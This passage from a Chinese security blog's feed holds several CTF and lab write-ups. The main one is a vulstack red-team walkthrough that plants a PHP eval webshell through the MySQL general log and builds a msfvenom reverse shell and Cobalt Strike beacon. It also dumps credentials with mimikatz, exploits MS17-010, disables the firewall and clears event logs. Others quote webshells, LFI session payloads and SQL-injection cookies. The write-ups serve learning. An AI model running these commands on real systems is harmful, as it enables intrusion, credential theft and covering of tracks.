general_log=on;</p><p>设置下日志路径（探针中查看）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;;</span><br></pre></td></tr></table></figure><p>接下来查询一下，内容是shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure><p>之后访问蚁剑链接shell就可以了</p><p>连上shell后whoami一下，发现是administrator权限，在GOD域下(?对域的概念还不太了解)</p><p>接下来使用msfvenom生成shell连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.54.2</span><br><span class="line">set lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>在蚁剑执行exe文件即可获得反弹shell</p><p>不太会用msf，执行命令一直啥都没有，最后知道msf有一套自己的命令，输入shell后获得了靶机的shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">启用RDP登录。</span><br></pre></td></tr></table></figure><p>接下来尝试上传cs 的beacon。</p><img src="http://cdn.polowong.top/static/images/vs12.jpg"><p>cs首先设置listener，生成Windows的32位可执行程序 a.exe</p><p>通过msf的meterpreter上传到目标主机并执行</p><p>upload /root/Desktop/1.exe</p><p>execute -f 1.exe</p><p>之后在cs可以看到服务器上线。</p><img src="http://cdn.polowong.top/static/images/vs13.jpg"><h2 id="msf-meterpreter-简介"><a href="#msf-meterpreter-简介" class="headerlink" title="msf meterpreter 简介"></a>msf meterpreter 简介</h2><p> Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p><p> 最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p><p> 需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>在cs中尝试使用mimikatz获取登录的用户名和密码</p><img src="http://cdn.polowong.top/static/images/vs14.jpg"><p>使用ladon扫描内网</p><img src="http://cdn.polowong.top/static/images/vs15.jpg"><p>得到结果：</p><p>192.168.52.3 139 445 3389</p><p>192.168.52.138 80 445 139 389</p><p>192.168.52.141 21 139</p><p>192.168.52.138主机389端口开启了LDAP服务，可能是DC。</p><p>下面尝试添加路由，使用Windows7作为跳板机访问Windows2003</p><img src="http://cdn.polowong.top/static/images/vs16.jpg"><p>经尝试后可以ping通，可以顺利访问。</p><h2 id="渗透域内成员141"><a href="#渗透域内成员141" class="headerlink" title="渗透域内成员141"></a>渗透域内成员141</h2><p>使用nmap对目标主机进行扫描，尝试扫描SMB漏洞</p><img src="http://cdn.polowong.top/static/images/vs17.jpg"><p>发现漏洞，尝试利用</p><img src="http://cdn.polowong.top/static/images/vs18.jpg"><p>成功获取目标机器的shell。</p><p>load mimikatz</p><p>mimikatz_command -f samdump::hashes 获取主机的密码，这样就成功抓到了主机的用户名和NTML-hash值。</p><h2 id="渗透域控"><a href="#渗透域控" class="headerlink" title="渗透域控"></a>渗透域控</h2><p>使用nmap对目标ip进行扫描，发现MS17-010和MS08-067漏洞，这次尝试利用MS17-010进行攻击。</p><p>首先关闭防火墙</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set command &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>接下来获得一个正向shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>之后我用mimikatz抓密码出了点问题，报错mod_process::getVeryBasicModulesListForProcess : (0x0000012b)</p><p>搜了搜这个问题是因为mimikatz默认加载32位系统，但是我们的系统是64位的，所以首先要将meterpreter迁移到一个64位进程上。</p><p>PS一下，选择权限为NT AUTHORITY\SYSTEM权限的进程</p><p>migrate  pid  即可。</p><p>之后在用mimikatz抓密码就能抓到了。</p><img src="http://cdn.polowong.top/static/images/vs19.jpg"><p>攻击结束后使用clearev命令清除攻击痕迹。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次完整地做内网渗透相关的练习，对内网渗透的过程不太熟悉，工具的使用也不熟悉，对一些概念性的基础问题也不太熟悉。。。希望能在后续的学习过程中不断完善这些方面。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7">https://shavchen.github.io/vulstack-1-writeup/#%E6%B8%97%E9%80%8F%E5%9F%9F%E6%8E%A7</a></p><p><a href="https://www.freebuf.com/column/230476.html">https://www.freebuf.com/column/230476.html</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14">https://www.cnblogs.com/wkzb/p/12358076.html#scroller-14</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulstack-红队评估（一）&quot;&gt;&lt;a href=&quot;#vulstack-红队评估（一）&quot; class=&quot;headerlink&quot; title=&quot;vulstack 红队评估（一）&quot;&gt;&lt;/a&gt;vulstack 红队评估（一）&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>comprehensive traffic analysis</title>
    <link href="https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/"/>
    <id>https://polosec.github.io/2020/11/30/comprehensive-traffic-analysis/</id>
    <published>2020-11-30T07:58:16.000Z</published>
    <updated>2020-11-30T07:59:52.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="2019-8-安恒流量分析"><a href="#2019-8-安恒流量分析" class="headerlink" title="2019.8 安恒流量分析"></a>2019.8 安恒流量分析</h2><ol><li>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可)</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</li><li>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码</li><li>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么</li><li>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少</li><li>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么</li><li>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号<a href="mailto:&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;">&#105;&#x6a;&#x6e;&#x75;&#64;&#116;&#101;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;</a>得到的密码是什么</li><li>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</li><li>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username/password）</li><li>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是少</li></ol><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>1.观察12281号包，看HTTP层的referrer，发现了AWVS的扫描器特征。</p><p>2.过滤http协议，发现/admin/login.php</p><p>3.过滤http协议，看86号包，发现了表单数据 username 人事 password hr123456（错误答案）</p><p>302跳转代表登陆成功</p><p>使用http contains “rec=login” and http.request.method==POST and ip.src==192.168.94.59 语句对webone进行过滤，将结果对时间进行排序，发现最后一个包中的username admin password admin!@#pass123</p><p>4.a.php 翻到最后发现了a.php 然后分组列表搜a.php 找POST包</p><p> Form item: “action” = “QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJb</p><p>使用 http contains “&lt;?php @eval”  过滤找一句话木马，但是没找到。</p><p>考虑TCP 重传可能导致http没追踪到，所以考虑使用tcp contains “&lt;?php @eval”</p><p>发现了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1234</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其base64encode即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>5.搜字符串robots.txt 发现flag flag:87b7cb79481f317bde90c116cf36084b</p><p>6.找到webshell的名称后，一直跟踪webshell，看看她在做什么。数据包大概在734581。</p><p>后面会发现查看了数据库配置文件，就发现了数据库账号密码 dbuser web dbpass e667jUPvJjXHvEUv</p><p>7.在web2数据包中 过滤mysql协议 分组字节流搜索字符串hash_code 看response包发现hash_code d1c029893df40cb0f47bcf8f1c3c17ac</p><p>8.web2数据包中 过滤mysql协议 搜索字符串 <a href="mailto:&#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;">&#105;&#106;&#x6e;&#x75;&#x40;&#116;&#101;&#x73;&#x74;&#46;&#x63;&#x6f;&#x6d;</a> ，看到md5加密的密码b78f5aa6e1606f07def6e839121a22ec，解密一下得到edc123!@#</p><p>9.追踪webshell包，发现了ifconfig命令。</p><p> -&gt;|eth0      Link encap:Ethernet  HWaddr 00:0C:29:CB:9F:85  \n</p><p>​          inet addr:192.168.32.189  Bcast:192.168.32.255  Mask:255.255.255.0\n</p><p>10.打开mailtwo数据包，过滤http流，发现第一个数据包里面的动作是登出，发现了用户名wenwenni。</p><p>然后看28号数据包的操作是访问登录页面，35号数据包发现了密码加密函数。</p><p>是AES-CBC加密，key为1234567812345678。</p><p>继续看42 44数据包，还是wenwenni用户登录，并且返回了 success true.</p><p>尝试使用如下过滤器过滤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; or http.request.method&#x3D;&#x3D;&quot;POST&quot;) and ip.addr&#x3D;&#x3D;192.168.94.59</span><br></pre></td></tr></table></figure><p>发现到最后也没爆破成功（这题看的别人的思路，我没懂）</p><p>然后打开mailto1 继续使用上述语句过滤</p><p>发现18512登陆成功，则密码在17126号数据包中。+ZgE14UGcFcyRGLI0/ZXPQ==</p><p>密码为1234567812345678的MD5值，偏移量为1234567812345678</p><p>AES解密得admin!@#PASS123</p><p>11.第一个vpn数据包在尝试登录vpn，然后看第二个。</p><p>统计一下会话信息，发现10.3.4.3 10.3.4.96 10.3.4.55 这几个ip之间的通信较多，然后过滤看看。</p><p>过滤一下smb协议，发现10.3.4.96是SMB服务器。</p><p>然后在看一下55这个ip</p><p> ip.addr==10.3.4.55  </p><p>发现10.3.4.3首先ping了10.3.4.55 所以确定10.3.4.3是黑客使用的vpn服务器。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对一些有手就行的过滤方法用的还可以，但是深入一点就不太行了 对一些流量动作的分析不太到位，对filter的用法也不太熟悉，比如\表转义。继续学习！</p><h2 id="待学习：PPTP协议、SMB协议"><a href="#待学习：PPTP协议、SMB协议" class="headerlink" title="待学习：PPTP协议、SMB协议"></a>待学习：PPTP协议、SMB协议</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_43431158/article/details/107176918">https://blog.csdn.net/qq_43431158/article/details/107176918</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;2019-8-安恒流量分析&quot;&gt;&lt;a href=&quot;#2019-8-安恒流量分析&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>安洵杯misc全wp</title>
    <link href="https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/"/>
    <id>https://polosec.github.io/2020/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFmisc%E5%85%A8wp/</id>
    <published>2020-11-26T09:42:26.000Z</published>
    <updated>2020-11-26T09:42:44.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="密码学-爆破"><a href="#密码学-爆破" class="headerlink" title="密码学 爆破"></a>密码学 爆破</h1><p>SECRET是不知道的</p><p>flag是md5(SECRET).hexdigest()</p><p>已知部分flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d0g3&#123;71b2b5616**2a4639**7d979**de964c&#125;</span><br></pre></td></tr></table></figure><p>cipher是sha256加密后的flag，其摘要为</p><p>0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a</p><p>现在不知道secret。</p><p>str1=”71b2b5616”</p><p>str2=”2a4639”</p><p>str3=”7d979”</p><p>str4=”de964c”</p><p>str1 2 3 4 之间分别有两位不知道 爆破的话需要爆破16^6次。</p><p>直接爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line">broken_flag= <span class="string">&#x27;71b2b5616**2a4639**7d979**de964c&#x27;</span></span><br><span class="line">str1=<span class="string">&quot;d0g3&#123;71b2b5616&quot;</span></span><br><span class="line">str2=<span class="string">&quot;2a4639&quot;</span></span><br><span class="line">str3=<span class="string">&quot;7d979&quot;</span></span><br><span class="line">str4=<span class="string">&quot;de964c&#125;&quot;</span></span><br><span class="line">cipher=<span class="string">&#x27;0596d989a2938e16bcc5d6f89ce709ad9f64d36316ab80408cb6b89b3d7f064a&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdigest</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span>  hashlib.sha256(content).hexdigest()</span><br><span class="line">alphabet=<span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> alphabet:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> alphabet:</span><br><span class="line">                        string=str1+a+b+str2+c+d+str3+e+f+str4</span><br><span class="line">                        <span class="keyword">if</span> getdigest(string)==cipher:</span><br><span class="line">                            <span class="built_in">print</span> string</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>扫码套娃，然后得到一个flag.docx，里面一串乱码，而且公众号也提示了不是emojidecode，但是这玩意除了emojidecode还能是啥？</p><p>因为我的word2016无法显示emoji，然后我换成rar解压，在xml里面看到了emoji，放到在线解密工具即可。（师傅们直接复制过去就完事了）</p><h2 id="王牌特工"><a href="#王牌特工" class="headerlink" title="王牌特工"></a>王牌特工</h2><p>这道题一开始没啥思路，然后file看一下是ext3格式。网上搜了一篇教程就差不多出来了。</p><p><a href="https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/">https://blog.ihomura.cn/2018/08/03/WriteUp-ext3-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D-HZ-file/</a></p><p>工具：fsstat，ext3grep，veracrypt。</p><p>装ext3grep的时候，报错了按照网上说的做增添一些东西，我这还会报错，把最后报错的那一行注释掉就完事儿了。</p><p>首先使用fsstat看镜像信息。</p><p>fsstat findme</p><p>其中root directory比较重要（我也不知道为什么）</p><p>接下来使用ext3grep查看文件信息。</p><p>ext3grep –inode 2 findme</p><img src="http://cdn.polowong.top/static/images/misc2.png"><p>恢复这个东西</p><p>ext3grep –restore-file .coolboy.swp findme </p><p>vim -r .coolboy.swp</p><p>新建一个目录/root/coolboy 恢复完会放到这里面，base64解码后的内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">真的密码:this_is_a_true_key</span><br></pre></td></tr></table></figure><p>用这个密码使用veracrypt去挂载flagbox，就可以获得flag。</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>一开始是hardzip，有个密码1，看文件比较短尝试CRC32爆破，爆破完的密码拼起来就是easyzip的解压密码。</p><p>解压下来easyzip，</p><p>通过伪加密拿到redeme.txt，尝试明文攻击。</p><p>这里需要注意的是，使用明文攻击需要保证待破解压缩包里只有一个文件，也就是已知文件。因为这里面有一个伪加密，其他文件的压缩算法可能与已知文件的不一致，所以为了保证顺利进行，需要将其他文件删除（这道题所需要，其他情况下如果加密方式都一样的话就不用删除。）</p><h2 id="misc4"><a href="#misc4" class="headerlink" title="misc4"></a>misc4</h2><p>npmtxt打开一看啥也不懂，010editor打开一看有看不懂的东西，搜了搜16进制慢慢搜就搜到了0宽隐写。</p><p>把那一串复制到<a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a> </p><p>decode就可以获得解压密码</p><p>RealV1siBle</p><img src="http://cdn.polowong.top/static/images/misc4.png"><p>打开是张图，silenteye一把梭出来flag。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次比赛觉得web比较难，ssti没做出来比较上心。最近打算深度学习ssti相关内容，争取下次做出来！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;密码学-爆破&quot;&gt;&lt;a href=&quot;#密码学-爆破&quot; class=&quot;headerlink&quot; title=&quot;密码学 爆破&quot;&gt;&lt;/a&gt;密码学 爆破&lt;/h1&gt;&lt;p&gt;SECRET是不知道的&lt;/p&gt;
&lt;p&gt;flag是md5(SECRET).hexdigest()&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>山东省新一代攻防赛wp</title>
    <link href="https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/"/>
    <id>https://polosec.github.io/2020/11/23/%E5%B1%B1%E4%B8%9C%E7%9C%81%E6%96%B0%E4%B8%80%E4%BB%A3%E6%94%BB%E9%98%B2%E8%B5%9Bwp/</id>
    <published>2020-11-23T14:01:58.000Z</published>
    <updated>2020-11-26T09:53:35.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>打聊城的比赛，又白给了，拿了参与奖，做出来两个misc，剩下两个misc都做了快一半，没思路了，特来复现。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开之后是一个登陆页面，查看源码发现了测试账号test/test</p><p>查看robots.txt 发现php.php 发现是phpinfo。</p><p>登录之后发现可能存在LFI，然后上了下扫描器，扫到了一些文件，尝试包含info.php，得到源码，然后发现了include了template/info.html，于是访问。查看源码发现了hint m4nageee.php。然后读manage的源码，在源码中发现包含了2333.html，于是访问。</p><p>查看源码时发现了php代码，尝试PHP session文件包含。</p><p>但是需要session的存放位置，于是通过扫描到的php.php查看session日志的存放位置/var/lib/php5，遂包含之。</p><p>在m4nageee里面写nickname到session文件里面，利用LFI包含getshell。</p><p>当前我的phpsessid为0u335c2ud2h9gjq0lq6nos1i72</p><p>所以session文件就是/var/lib/php5/sess_0u335c2ud2h9gjq0lq6nos1i72,包含即可。</p><p>nikename里面写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fla*&quot;</span>)； <span class="meta">?&gt;</span></span><br><span class="line"> 即可绕过对flag的过滤</span><br><span class="line"></span><br><span class="line">或者这样写</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;cat fl\ag_0ba7bc92fcd57e337ebb9e74308c811f&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">等等。。</span><br></pre></td></tr></table></figure><h2 id="web2-web3"><a href="#web2-web3" class="headerlink" title="web2 web3"></a>web2 web3</h2><p>题目提示使用sqlmap注入，但是我注入巨拉跨。。而且数据库是sqlite的，我只会一点mysql的注入。。当时没做出来，赛后复现下。</p><p>这题是使用cookie注入。我明确地知道自己不会用sqlmap进行cookie注入。</p><h3 id="不会-跟官方的思路没复现出来，等wp。"><a href="#不会-跟官方的思路没复现出来，等wp。" class="headerlink" title="不会 跟官方的思路没复现出来，等wp。"></a>不会 跟官方的思路没复现出来，等wp。</h3><p>这里放下济大师傅的web2 web3的payload：</p><p>Cookie: PHPSESSID=da55nb2kgsge2luvc5m53k5r90; username=test; password=test’ OR 1=1 LIMIT 1 OFFSET 1 – </p><p>password=test’ OR 1=1 LIMIT 1 OFFSET 1 – ; userinfo=eyJ1c2VybmFtZSI6InRlc3QiLCJwYXNzd29yZCI6InRlc3QnIE9SIDE9MSBMSU1JVCAxIE9GRlNFVCAxIC0tICJ9Cg%3D%3D</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-decode"><a href="#ez-decode" class="headerlink" title="ez_decode"></a>ez_decode</h2><p>简单的编码转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#54;&amp;#54;&amp;#54;&amp;#99;&amp;#54;&amp;#49;&amp;#54;&amp;#55;&amp;#55;&amp;#98;&amp;#54;&amp;#54;&amp;#51;&amp;#57;&amp;#54;&amp;#52;&amp;#54;&amp;#54;&amp;#51;&amp;#53;&amp;#51;&amp;#52;&amp;#51;&amp;#48;&amp;#51;&amp;#49;&amp;#51;&amp;#48;&amp;#51;&amp;#48;&amp;#51;&amp;#56;&amp;#51;&amp;#51;&amp;#54;&amp;#50;&amp;#51;&amp;#48;&amp;#54;&amp;#54;&amp;#51;&amp;#49;&amp;#54;&amp;#54;&amp;#51;&amp;#50;&amp;#51;&amp;#51;&amp;#54;&amp;#49;&amp;#51;&amp;#51;&amp;#54;&amp;#53;&amp;#54;&amp;#49;&amp;#54;&amp;#53;&amp;#54;&amp;#51;&amp;#54;&amp;#51;&amp;#51;&amp;#53;&amp;#54;&amp;#52;&amp;#51;&amp;#53;&amp;#54;&amp;#49;&amp;#51;&amp;#55;&amp;#54;&amp;#51;&amp;#55;&amp;#100;</span><br></pre></td></tr></table></figure><p>html实体编码-&gt;hexo2string-&gt;flag</p><p>flag{f9df54010083b0f1f23a3eaecc5d5a7c}</p><h2 id="qr-code"><a href="#qr-code" class="headerlink" title="qr_code:"></a>qr_code:</h2><img src="http://cdn.polowong.top/static/images/qrcode.png"><p>打开很多二维码，盲猜扫出来内容转0和1</p><p>比赛的时候有个简单的读二维码的工具，但是批量不会写脚本。。就读了两个，看哪个是0哪个是1，然后bin2ascii就可以了。</p><p>用脚本的做法：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*-coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span>  os</span><br><span class="line"><span class="keyword">import</span>  zxing</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">reader=zxing.BarCodeReader()</span><br><span class="line">asc=<span class="string">&#x27;&#x27;</span></span><br><span class="line">path=<span class="string">&quot;C:\\Users\\Administrator\\Desktop\\聊城\\qrcode&quot;</span></span><br><span class="line">files=os.listdir(path)</span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span>  <span class="built_in">range</span> (<span class="number">0</span>,<span class="built_in">len</span>(files)-<span class="number">1</span>):</span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#         content=reader.decode(file).raw</span></span><br><span class="line">    <span class="comment">#         if content==&quot;zero&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(0) #这是识别二维码的方法</span></span><br><span class="line">    <span class="comment">#         if content==&quot;one&quot;:</span></span><br><span class="line">    <span class="comment">#             asc+=str(1)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     pass</span></span><br><span class="line">    size=os.path.getsize(<span class="built_in">str</span>(i)+<span class="string">&quot;.png&quot;</span>)</span><br><span class="line">   <span class="comment">#这是使用filesize做的方法</span></span><br><span class="line">    <span class="keyword">if</span> size==<span class="number">3409</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        asc+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">asc=<span class="built_in">int</span>(asc,base=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(asc)</span><br><span class="line">asc=<span 